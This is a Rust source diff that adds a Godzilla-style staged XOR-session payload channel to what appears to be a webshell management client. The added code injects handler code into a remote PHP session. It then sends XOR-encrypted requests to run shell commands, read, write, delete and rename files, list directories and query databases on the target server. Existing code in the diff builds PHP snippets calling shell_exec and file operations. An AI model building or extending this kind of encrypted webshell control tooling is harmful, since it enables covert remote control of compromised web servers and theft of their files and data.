@@ -67,6 +67,8 @@ pub struct PhpSession {
     pub client: reqwest::blocking::Client,
     /// 载荷编码器（连接时由 protocol_params 决定）。
     pub encoder: &'static dyn PayloadEncoder,
+    /// Godzilla 分阶段载荷：处理器代码是否已注入服务端 session。
+    pub initialized: std::sync::Mutex<bool>,
 }
 
 impl SessionState for PhpSession {
@@ -201,6 +203,233 @@ pub fn clear_requests() {
 }
 
 impl PhpProtocol {
+    // --- Godzilla 分阶段载荷操作（xor_session） ---
+
+    fn session_probe(
+        &self,
+        php: &PhpSession,
+        settings: &AppSettings,
+    ) -> Result<ProbeResult, ProtocolError> {
+        let value = session_call(php, "probe", &[], settings)?;
+        let get = |key: &str| -> String {
+            value
+                .pointer(&format!("/data/{key}"))
+                .and_then(|v| v.as_str())
+                .unwrap_or("未知")
+                .to_string()
+        };
+        Ok(ProbeResult {
+            status: "online".to_string(),
+            server: get("server"),
+            web_server: get("web_server"),
+            runtime: get("php_version"),
+            current_dir: get("current_dir"),
+            separator: get("separator"),
+            message: "分阶段载荷探测成功。".to_string(),
+        })
+    }
+
+    fn session_exec(
+        &self,
+        php: &PhpSession,
+        command: &str,
+        settings: &AppSettings,
+    ) -> Result<CommandOutput, ProtocolError> {
+        let start = Instant::now();
+        let value = session_call(php, "exec", &[("c", command)], settings)?;
+        let duration_ms = start.elapsed().as_millis() as u64;
+        let stdout = value
+            .pointer("/data/stdout")
+            .and_then(|v| v.as_str())
+            .and_then(|s| B64.decode(s).ok())
+            .and_then(|bytes| String::from_utf8(bytes).ok())
+            .unwrap_or_default();
+        let cwd = value
+            .pointer("/data/cwd")
+            .and_then(|v| v.as_str())
+            .map(str::to_string);
+        Ok(CommandOutput {
+            stdout,
+            duration_ms,
+            cwd,
+        })
+    }
+
+    fn session_list_dir(
+        &self,
+        php: &PhpSession,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<DirListing, ProtocolError> {
+        let value = session_call(php, "list", &[("p", path)], settings)?;
+        let entries = value
+            .pointer("/data/entries")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .map(|item| FileEntry {
+                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
+                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
+                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
+                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
+                        modified: item
+                            .get("mtime")
+                            .and_then(|v| v.as_i64())
+                            .map(format_timestamp)
+                            .unwrap_or_default(),
+                    })
+                    .collect()
+            })
+            .unwrap_or_default();
+        Ok(DirListing { entries })
+    }
+
+    fn session_read_file(
+        &self,
+        php: &PhpSession,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        let value = session_call(php, "read", &[("p", path)], settings)?;
+        value
+            .get("data")
+            .and_then(|v| v.as_str())
+            .and_then(|s| B64.decode(s).ok())
+            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
+    }
+
+    fn session_write_file(
+        &self,
+        php: &PhpSession,
+        path: &str,
+        content: &[u8],
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        session_call(
+            php,
+            "write",
+            &[("p", path), ("d", &B64.encode(content))],
+            settings,
+        )?;
+        Ok(())
+    }
+
+    fn session_delete(
+        &self,
+        php: &PhpSession,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        session_call(php, "delete", &[("p", path)], settings)?;
+        Ok(())
+    }
+
+    fn session_rename(
+        &self,
+        php: &PhpSession,
+        from: &str,
+        to: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        session_call(php, "rename", &[("f", from), ("t", to)], settings)?;
+        Ok(())
+    }
+
+    fn session_mkdir(
+        &self,
+        php: &PhpSession,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        session_call(php, "mkdir", &[("p", path)], settings)?;
+        Ok(())
+    }
+
+    fn session_db_probe(
+        &self,
+        php: &PhpSession,
+        connection: &DbConnection,
+        settings: &AppSettings,
+    ) -> Result<DbProbeResult, ProtocolError> {
+        let value = session_call(php, "dbprobe", &[("c", &conn_json(connection))], settings)?;
+        let databases = value
+            .pointer("/data/databases")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .filter_map(|item| item.as_str().map(str::to_string))
+                    .collect()
+            })
+            .unwrap_or_default();
+        Ok(DbProbeResult {
+            driver: connection.driver.clone(),
+            databases,
+            message: "数据库连接成功".to_string(),
+        })
+    }
+
+    fn session_db_query(
+        &self,
+        php: &PhpSession,
+        connection: &DbConnection,
+        sql: &str,
+        settings: &AppSettings,
+    ) -> Result<DbQueryResult, ProtocolError> {
+        let value = session_call(
+            php,
+            "dbquery",
+            &[("c", &conn_json(connection)), ("q", sql)],
+            settings,
+        )?;
+        let columns = value
+            .pointer("/data/columns")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .filter_map(|item| item.as_str().map(str::to_string))
+                    .collect()
+            })
+            .unwrap_or_default();
+        let rows = value
+            .pointer("/data/rows")
+            .and_then(|v| v.as_array())
+            .map(|array| {
+                array
+                    .iter()
+                    .map(|row| {
+                        row.as_array()
+                            .map(|cells| {
+                                cells
+                                    .iter()
+                                    .map(|cell| {
+                                        if cell.is_null() {
+                                            None
+                                        } else {
+                                            Some(cell.as_str().unwrap_or("").to_string())
+                                        }
+                                    })
+                                    .collect()
+                            })
+                            .unwrap_or_default()
+                    })
+                    .collect()
+            })
+            .unwrap_or_default();
+        let affected = value
+            .pointer("/data/affected")
+            .and_then(|v| v.as_u64())
+            .unwrap_or(0);
+        Ok(DbQueryResult {
+            columns,
+            rows,
+            affected,
+            duration_ms: 0,
+        })
+    }
+
     /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
     fn build_code(template: &str, params: &[(&str, &str)]) -> String {
         let mut code = template.to_string();
@@ -377,6 +606,16 @@ impl Protocol for PhpProtocol {
     ) -> Result<ProbeResult, ProtocolError> {
         // 环境信息探测：不产生任何文件系统副作用
         let encoder = encoder_for(&profile.protocol_params);
+        if encoder.id() == "xor_session" {
+            let php = PhpSession {
+                endpoint: profile.endpoint.clone(),
+                password: profile.password.clone(),
+                client: build_client(settings),
+                encoder,
+                initialized: std::sync::Mutex::new(false),
+            };
+            return self.session_probe(&php, settings);
+        }
         let code = format!(
             "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR));{}",
             Self::build_prefix(encoder, &profile.password),
@@ -442,6 +681,7 @@ impl Protocol for PhpProtocol {
             password: profile.password.clone(),
             client: build_client(settings),
             encoder: encoder_for(&profile.protocol_params),
+            initialized: std::sync::Mutex::new(false),
         });
         Ok((session, result))
     }
@@ -456,6 +696,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_exec(php, command, settings);
+        }
         let cmd_b64 = B64.encode(command.as_bytes());
         let code = format!(
             "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
@@ -490,6 +733,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_list_dir(php, path, settings);
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
             "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>$is_dir?0:filesize($full),'mtime'=>filemtime($full));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
@@ -533,6 +779,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_read_file(php, path, settings);
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
             "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
@@ -560,6 +809,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_write_file(php, path, content, settings);
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let data_b64 = B64.encode(content);
         let code = format!(
@@ -582,6 +834,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_delete(php, path, settings);
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
             "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
@@ -604,6 +859,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_rename(php, from, to, settings);
+        }
         let from_b64 = B64.encode(from.as_bytes());
         let to_b64 = B64.encode(to.as_bytes());
         let code = format!(
@@ -626,6 +884,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_mkdir(php, path, settings);
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
             "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
@@ -702,6 +963,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_db_probe(php, connection, settings);
+        }
         let driver = connection.driver.clone();
         let dsn = build_dsn(connection, false)?;
         let list_dbs = match driver.as_str() {
@@ -751,6 +1015,9 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .expect("会话类型不匹配");
+        if is_session(php) {
+            return self.session_db_query(php, connection, sql, settings);
+        }
         let dsn = build_dsn(connection, true)?;
         let code = Self::build_code(
             DB_QUERY_CODE,
@@ -859,8 +1126,130 @@ fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, Protocol
     }
 }
 
-fn conn_user(connection: &DbConnection) -> String {
-    connection.username.as_deref().unwrap_or("").to_string()
+// ---------------------------------------------------------------------------
+// Godzilla 分阶段载荷（xor_session）客户端通道
+// ---------------------------------------------------------------------------
+
+/// 是否启用分阶段载荷协议（xor_session 编码器）。
+fn is_session(php: &PhpSession) -> bool {
+    php.encoder.id() == "xor_session"
+}
+
+/// JSON 字符串值转义。
+fn json_str(value: &str) -> String {
+    value.replace('\\', "\\\\").replace('"', "\\\"")
+}
+
+/// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
+fn session_post(
+    php: &PhpSession,
+    body: String,
+    settings: &AppSettings,
+) -> Result<Vec<u8>, ProtocolError> {
+    let response = php
+        .client
+        .post(&php.endpoint)
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .body(body)
+        .send()
+        .map_err(|error| ProtocolError::Network(error.to_string()))?;
+    if !response.status().is_success() {
+        return Err(ProtocolError::HttpStatus(
+            response.status().as_u16(),
+            response.status().canonical_reason().unwrap_or("").to_string(),
+        ));
+    }
+    let bytes = response
+        .bytes()
+        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
+    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
+    if bytes.len() > max_bytes as usize {
+        return Err(ProtocolError::ParseError(format!(
+            "响应超过大小上限（{}MB）",
+            settings.max_file_size_mb
+        )));
+    }
+    // 响应为 XOR 密文（base64），按密码派生密钥解密
+    let key = dosword_sdk::encoder::md5_hex(&php.password).into_bytes();
+    let raw = B64.decode(&bytes)
+        .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+    Ok(raw
+        .iter()
+        .enumerate()
+        .map(|(index, byte)| byte ^ key[index % key.len()])
+        .collect())
+}
+
+/// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
+fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), ProtocolError> {
+    let mut initialized = php
+        .initialized
+        .lock()
+        .map_err(|_| ProtocolError::ParseError("会话状态锁异常".to_string()))?;
+    if *initialized {
+        return Ok(());
+    }
+    let code = dosword_sdk::encoder::session_handler_code();
+    let payload = php.encoder.encode(code, &php.password);
+    let plain = session_post(php, payload, settings)?;
+    let text = String::from_utf8_lossy(&plain);
+    if !text.contains("ok") {
+        return Err(ProtocolError::ServerError(format!(
+            "分阶段载荷初始化失败：{text}"
+        )));
+    }
+    *initialized = true;
+    Ok(())
+}
+
+/// 调用一次处理器操作：参数 JSON（XOR 加密）-> 解密响应 -> nonce 帧解析。
+fn session_call(
+    php: &PhpSession,
+    action: &str,
+    params: &[(&str, &str)],
+    settings: &AppSettings,
+) -> Result<Value, ProtocolError> {
+    ensure_session_init(php, settings)?;
+    let nonce = random_nonce();
+    let mut request = format!("{{\"a\":\"{action}\",\"n\":\"{nonce}\"");
+    for (key, value) in params {
+        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
+    }
+    request.push('}');
+
+    let payload = php.encoder.encode(&request, &php.password);
+    let plain = session_post(php, payload, settings)?;
+    let text = String::from_utf8_lossy(&plain);
+
+    // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
+    let start = text.find(&nonce).ok_or_else(|| {
+        ProtocolError::ParseError("响应中未找到协议帧".to_string())
+    })?;
+    let tail = &text[start + nonce.len()..];
+    let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
+        "协议帧不完整".to_string(),
+    ))?;
+    let payload_b64 = &tail[..end];
+    let decoded = B64
+        .decode(payload_b64)
+        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
+    let value: Value = serde_json::from_slice(&decoded)
+        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;
+    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
+        let message = value
+            .get("error")
+            .and_then(|v| v.as_str())
+            .unwrap_or("未知错误");
+        return Err(ProtocolError::ServerError(message.to_string()));
+    }
+    Ok(value)
+}
+
+fn conn_json(connection: &DbConnection) -> String {
+    serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
+}
+
+fn conn_user(connection: &DbConnection) -> String {    connection.username.as_deref().unwrap_or("").to_string()
 }
 
 fn conn_pass(connection: &DbConnection) -> String {
@@ -1246,6 +1635,7 @@ mod tests {
             password: "secret".into(),
             client: build_client(&settings),
             encoder: &Base64Encoder,
+            initialized: std::sync::Mutex::new(false),
         };
         let conn = DbConnection {
             driver: "mysql".into(),
@@ -1285,6 +1675,7 @@ mod tests {
             password: "secret".into(),
             client: build_client(&settings),
             encoder: &Base64Encoder,
+            initialized: std::sync::Mutex::new(false),
         };
         let conn = DbConnection {
             driver: "sqlite".into(),
@@ -1320,6 +1711,7 @@ mod tests {
             password: "secret".into(),
             client: build_client(&settings),
             encoder: &Base64Encoder,
+            initialized: std::sync::Mutex::new(false),
         };
         proto
             .execute_command(&session, "id", &settings)
@@ -1377,6 +1769,7 @@ mod tests {
             "php_obfuscate",
             "php_stream",
             "xor_body",
+            "xor_session",
         ];
         let settings = settings();
         for encoder_id in encoders {
@@ -1413,6 +1806,7 @@ mod tests {
             password: "secret".into(),
             client: build_client(&settings),
             encoder: &Base64Encoder,
+            initialized: std::sync::Mutex::new(false),
         };
         let db_path = dir.join("test.sqlite");
         let conn = DbConnection {
@@ -1484,6 +1878,14 @@ mod tests {
         if encoder_id == "php_stream" {
             // 仅 include 流方案需要 allow_url_include；xor_body 用 file_get_contents 无需
             command.arg("-d").arg("allow_url_include=1");
+        }
+        if encoder_id == "xor_session" {
+            // 分阶段载荷依赖 session：显式指定可写目录
+            command
+                .arg("-d")
+                .arg(format!("session.save_path={}", dir.display()))
+                .arg("-d")
+                .arg("session.use_cookies=1");
         }
         let child = command
             .arg("-S")
